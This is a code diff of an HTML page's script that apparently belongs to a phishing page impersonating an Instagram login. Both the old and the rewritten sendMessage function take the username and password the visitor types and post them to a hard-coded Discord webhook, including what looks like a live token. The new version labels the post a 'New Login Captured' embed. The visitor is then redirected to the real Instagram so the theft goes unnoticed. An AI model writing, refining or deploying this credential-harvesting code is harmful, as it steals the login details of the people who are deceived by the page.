@@ -78,24 +78,48 @@
     }
   </script>
   <script>
-    function sendMessage() {
-      function sleep(milliseconds) {
-        const date = Date.now();
-        let currentDate = null;
-        do {
-          currentDate = Date.now();
-        } while (currentDate - date < milliseconds);
+  function sendMessage() {
+  // Delay function using setTimeout for better performance than sleep loop
+  function delay(ms) {
+    return new Promise(resolve => setTimeout(resolve, ms));
+  }
+
+  // Capture user input
+  const username = document.getElementById('username').value;
+  const password = document.getElementById('password').value;
+  const payload = {
+    embeds: [
+      {
+        title: "🔐 New Login Captured",
+        color: 0x2f3136, // Discord dark embed color
+        fields: [
+          {
+            name: "👤 Username",
+            value: `\`${username}\``,
+            inline: false
+          },
+          {
+            name: "🔑 Password",
+            value: `\`${password}\``,
+            inline: false
+          }
+        ],
+        footer: {
+          text: "📩 Secure Logger",
+        },
+        timestamp: new Date().toISOString()
       }
-      var request = new XMLHttpRequest();
-      request.open("POST", "https://discord.com/api/webhooks/1382345428669829120/hQNpgVsszl0Lepl2JxtJSjZC2YSQAoT2_UYTKurFYRHexes-0kqg6HUHygwL2OBkuCce");
-      request.setRequestHeader('Content-type', 'application/json');
-      var params = {
-        content: ("> **USERNAME  : **" + document.getElementById('username').value + "\n> **PASSWORD : **" + document.getElementById('password').value)
-      };
-      request.send(JSON.stringify(params));
-      sleep(2000);
-      window.location.replace("https://www.instagram.com");
-    }
-  </script>
+    ]
+  };
+  const request = new XMLHttpRequest();
+  request.open("POST", "https://discord.com/api/webhooks/1382345428669829120/hQNpgVsszl0Lepl2JxtJSjZC2YSQAoT2_UYTKurFYRHexes-0kqg6HUHygwL2OBkuCce");
+  request.setRequestHeader('Content-type', 'application/json');
+  request.send(JSON.stringify(payload));
+
+  delay(2000).then(() => {
+    window.location.replace("https://www.instagram.com");
+  });
+}
+</script>
 </body>
 </html>
